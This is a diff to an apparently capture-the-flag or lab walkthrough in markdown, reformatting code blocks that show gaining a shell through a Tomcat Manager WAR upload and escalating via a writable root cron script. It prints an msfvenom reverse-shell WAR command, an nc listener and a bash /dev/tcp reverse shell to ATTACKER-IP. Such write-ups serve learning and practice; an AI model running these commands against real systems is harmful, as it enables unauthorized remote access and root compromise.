@@ -41,6 +41,7 @@ The Tomcat Manager allows uploading `.war` files, which can be used to gain a re
 ### Generate malicious WAR file and start listener:
 
 ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER-IP LPORT=4444 -f war -o shell.war```
+
 ```nc -lvnp 4444```
 
 <img src="assets/war-file.png" width="700">
@@ -79,8 +80,9 @@ This script runs as root and is writable.
 
 We overwrite the script with a reverse shell:
 
-`echo 'bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1' > /home/jack/id.sh
-chmod +x /home/jack/id.sh`
+```echo 'bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1' > /home/jack/id.sh```
+
+```chmod +x /home/jack/id.sh```
 
 <img src="assets/exploiting-cronjob.png" width="700">
 
